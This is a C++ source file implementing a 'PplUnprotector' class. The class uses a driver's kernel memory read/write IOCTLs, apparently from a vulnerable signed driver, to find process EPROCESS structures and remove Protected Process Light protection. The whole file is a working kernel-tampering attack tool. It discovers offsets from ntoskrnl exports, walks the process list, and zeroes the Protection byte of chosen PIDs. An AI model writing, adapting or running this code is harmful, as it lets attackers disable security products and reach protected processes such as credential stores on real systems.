#include "PplUnprotector.h"

#include <algorithm>
#include <cstdint>
#include <cstring>

#pragma comment(lib, "ntdll.lib")

namespace {

constexpr DWORD kIoctlRead = 0x80002048;
constexpr DWORD kIoctlWrite = 0x8000204C;

struct alignas(8) MemoryRequest {
    BYTE pad0[8];
    DWORD64 address;
    BYTE pad1[8];
    DWORD size;
    DWORD value;
    BYTE pad3[16];
};

struct EprocessOffsets {
    DWORD psInitialSystemProcessRva = 0;
    DWORD uniqueProcessId = 0;
    DWORD activeProcessLinks = 0;
    DWORD protection = 0;
};

struct SystemModuleEntry {
    HANDLE section;
    PVOID mappedBase;
    PVOID imageBase;
    ULONG imageSize;
    ULONG flags;
    USHORT loadOrderIndex;
    USHORT initOrderIndex;
    USHORT loadCount;
    USHORT pathLength;
    char imageName[256];
};

struct SystemModuleInformation {
    ULONG count;
    SystemModuleEntry modules[1];
};

struct ResolvedTarget {
    DWORD pid = 0;
    ULONG_PTR eprocess = 0;
    BYTE protection = 0;
    bool found = false;
    bool lowered = false;
};

HANDLE g_memoryDevice = INVALID_HANDLE_VALUE;
EprocessOffsets g_offsets;
ULONG_PTR g_kernelBase = 0;
bool g_ready = false;

extern "C" NTSTATUS NTAPI NtQuerySystemInformation(
    ULONG systemInformationClass,
    PVOID systemInformation,
    ULONG systemInformationLength,
    PULONG returnLength
);

bool IsReadableCode(const void* address, size_t size) {
    if (!address || size == 0) return false;

    MEMORY_BASIC_INFORMATION region{};
    if (VirtualQuery(address, &region, sizeof(region)) == 0) return false;
    if (region.State != MEM_COMMIT) return false;
    if (region.Protect & (PAGE_NOACCESS | PAGE_GUARD)) return false;

    const uintptr_t start = reinterpret_cast<uintptr_t>(address);
    const uintptr_t end = start + size;
    const uintptr_t regionStart = reinterpret_cast<uintptr_t>(region.BaseAddress);
    const uintptr_t regionEnd = regionStart + region.RegionSize;
    return end >= start && end <= regionEnd;
}

bool ReadDisplacementAt(const BYTE* code, size_t size, size_t opcode,
                        BYTE first, BYTE second, DWORD& displacement) {
    if (opcode + 6 > size) return false;
    if (code[opcode] != first || code[opcode + 1] != second) return false;

    std::memcpy(&displacement, code + opcode + 2, sizeof(displacement));
    return displacement > 0 && displacement < 0x4000;
}

bool FindDisplacement(const void* function, BYTE first, BYTE second,
                      DWORD& displacement) {
    constexpr size_t kProbeSize = 32;
    if (!IsReadableCode(function, kProbeSize)) return false;

    const BYTE* code = static_cast<const BYTE*>(function);
    for (size_t i = 0; i + 6 <= kProbeSize; ++i) {
        if (ReadDisplacementAt(code, kProbeSize, i, first, second, displacement)) {
            return true;
        }
    }
    return false;
}

bool GetKernelBase(ULONG_PTR& base) {
    ULONG required = 0;
    NtQuerySystemInformation(11, nullptr, 0, &required);
    if (required == 0) return false;

    std::vector<BYTE> buffer(required + 4096);
    const NTSTATUS status = NtQuerySystemInformation(
        11, buffer.data(), static_cast<ULONG>(buffer.size()), &required
    );
    if (status < 0) return false;

    const auto* information = reinterpret_cast<const SystemModuleInformation*>(
        buffer.data()
    );
    if (information->count == 0) return false;

    base = reinterpret_cast<ULONG_PTR>(information->modules[0].imageBase);
    return base != 0;
}

bool DiscoverOffsets(EprocessOffsets& offsets, ULONG_PTR& kernelBase) {
    if (!GetKernelBase(kernelBase)) return false;

    HMODULE kernel = LoadLibraryW(L"ntoskrnl.exe");
    if (!kernel) return false;

    bool success = false;
    do {
        const auto moduleBase = reinterpret_cast<ULONG_PTR>(kernel);

        const auto psInitialSystemProcess = GetProcAddress(
            kernel, "PsInitialSystemProcess"
        );
        if (!psInitialSystemProcess) break;

        const auto psInitialAddress = reinterpret_cast<ULONG_PTR>(
            psInitialSystemProcess
        );
        if (psInitialAddress <= moduleBase) break;
        const ULONG_PTR rva = psInitialAddress - moduleBase;
        if (rva > MAXDWORD) break;
        offsets.psInitialSystemProcessRva = static_cast<DWORD>(rva);

        const void* psGetProcessId = GetProcAddress(kernel, "PsGetProcessId");
        if (!psGetProcessId
            || !FindDisplacement(psGetProcessId, 0x8B, 0x81,
                                 offsets.uniqueProcessId)) {
            break;
        }
        offsets.activeProcessLinks = offsets.uniqueProcessId + sizeof(HANDLE);

        const void* psIsProtected = GetProcAddress(
            kernel, "PsIsProtectedProcess"
        );
        const void* psIsProtectedLight = GetProcAddress(
            kernel, "PsIsProtectedProcessLight"
        );
        if (!psIsProtected || !psIsProtectedLight) break;

        DWORD protection = 0;
        DWORD protectionLight = 0;
        if (!FindDisplacement(psIsProtected, 0xF6, 0x81, protection)) break;
        if (!FindDisplacement(psIsProtectedLight, 0x8A, 0x91,
                              protectionLight)) {
            break;
        }
        if (protection == 0 || protection != protectionLight) break;
        offsets.protection = protection;

        success = true;
    } while (false);

    FreeLibrary(kernel);
    return success;
}

bool RtcRead32(HANDLE device, ULONG_PTR address, DWORD& value) {
    MemoryRequest request{};
    request.address = address;
    request.size = sizeof(DWORD);

    DWORD returned = 0;
    if (!DeviceIoControl(device, kIoctlRead, &request, sizeof(request),
                         &request, sizeof(request), &returned, nullptr)) {
        return false;
    }

    value = request.value;
    return true;
}

bool RtcRead8(HANDLE device, ULONG_PTR address, BYTE& value) {
    DWORD wideValue = 0;
    if (!RtcRead32(device, address, wideValue)) return false;
    value = static_cast<BYTE>(wideValue & 0xFF);
    return true;
}

bool RtcReadPointer(HANDLE device, ULONG_PTR address, ULONG_PTR& value) {
    DWORD low = 0;
    DWORD high = 0;
    if (!RtcRead32(device, address, low)
        || !RtcRead32(device, address + sizeof(DWORD), high)) {
        return false;
    }

    value = static_cast<ULONG_PTR>(
        (static_cast<DWORD64>(high) << 32) | low
    );
    return true;
}

bool RtcWrite8(HANDLE device, ULONG_PTR address, BYTE value) {
    MemoryRequest request{};
    request.address = address;
    request.size = sizeof(BYTE);
    request.value = value;

    DWORD returned = 0;
    return DeviceIoControl(device, kIoctlWrite, &request, sizeof(request),
                           &request, sizeof(request), &returned, nullptr)
        != FALSE;
}

bool IsKernelAddress(ULONG_PTR address) {
    if (address == 0) return false;
    return (address >> 48) == 0xFFFF;
}

ResolvedTarget* FindTarget(std::vector<ResolvedTarget>& targets, DWORD pid) {
    for (ResolvedTarget& target : targets) {
        if (target.pid == pid) return &target;
    }
    return nullptr;
}

bool WalkProcessList(HANDLE device, std::vector<ResolvedTarget>& targets) {
    const ULONG_PTR psInitialSystemProcess = g_kernelBase
        + g_offsets.psInitialSystemProcessRva;

    ULONG_PTR systemProcess = 0;
    if (!RtcReadPointer(device, psInitialSystemProcess, systemProcess)
        || !IsKernelAddress(systemProcess)) {
        return false;
    }

    ULONG_PTR current = systemProcess;
    bool completed = false;

    for (size_t i = 0; i < 131072; ++i) {
        ULONG_PTR pidValue = 0;
        if (!RtcReadPointer(device,
                            current + g_offsets.uniqueProcessId,
                            pidValue)) {
            return false;
        }

        const DWORD pid = static_cast<DWORD>(pidValue);
        ResolvedTarget* target = FindTarget(targets, pid);
        if (target && !target->found) {
            BYTE protection = 0;
            if (!RtcRead8(device, current + g_offsets.protection,
                          protection)) {
                return false;
            }
            target->eprocess = current;
            target->protection = protection;
            target->found = true;
        }

        ULONG_PTR nextLink = 0;
        if (!RtcReadPointer(device,
                            current + g_offsets.activeProcessLinks,
                            nextLink)) {
            return false;
        }
        if (!IsKernelAddress(nextLink)
            || nextLink < g_offsets.activeProcessLinks) {
            return false;
        }

        current = nextLink - g_offsets.activeProcessLinks;
        if (!IsKernelAddress(current)) return false;
        if (current == systemProcess) {
            completed = true;
            break;
        }
    }

    return completed;
}

} // namespace

bool PplUnprotector::Initialize(HANDLE memoryDevice) {
    g_memoryDevice = memoryDevice;
    g_ready = false;
    g_kernelBase = 0;
    g_offsets = {};

    if (memoryDevice == INVALID_HANDLE_VALUE) return false;
    if (!DiscoverOffsets(g_offsets, g_kernelBase)) return false;

    g_ready = true;
    return true;
}

bool PplUnprotector::Probe(DWORD pid, PplTargetResult& result) {
    result = {};
    result.pid = pid;
    if (!g_ready || pid == 0) return false;

    std::vector<ResolvedTarget> targets;
    ResolvedTarget target{};
    target.pid = pid;
    targets.push_back(target);

    if (!WalkProcessList(g_memoryDevice, targets)) return false;

    const ResolvedTarget& found = targets.front();
    result.found = found.found;
    result.lowered = false;
    result.protection = found.protection;
    return found.found;
}

bool PplUnprotector::LowerProtection(const std::vector<DWORD>& pids,
                                     std::vector<PplTargetResult>& results) {
    results.clear();
    results.reserve(pids.size());

    std::vector<ResolvedTarget> targets;
    targets.reserve(pids.size());
    for (DWORD pid : pids) {
        if (pid == 0) continue;
        if (!FindTarget(targets, pid)) {
            ResolvedTarget target{};
            target.pid = pid;
            targets.push_back(target);
        }
    }

    if (!g_ready || !WalkProcessList(g_memoryDevice, targets)) {
        for (const ResolvedTarget& target : targets) {
            results.push_back({ target.pid, false, false, 0 });
        }
        return false;
    }

    for (ResolvedTarget& target : targets) {
        if (!target.found) {
            results.push_back({ target.pid, false, false, 0 });
            continue;
        }

        if (target.protection == 0) {
            target.lowered = true;
        } else {
            const ULONG_PTR protectionAddress =
                target.eprocess + g_offsets.protection;
            BYTE verified = 0xFF;
            target.lowered =
                RtcWrite8(g_memoryDevice, protectionAddress, 0)
                && RtcRead8(g_memoryDevice, protectionAddress, verified)
                && verified == 0;
        }

        results.push_back({
            target.pid,
            target.found,
            target.lowered,
            target.protection
        });
    }

    return true;
}

bool PplUnprotector::IsReady() {
    return g_ready && g_memoryDevice != INVALID_HANDLE_VALUE;
}
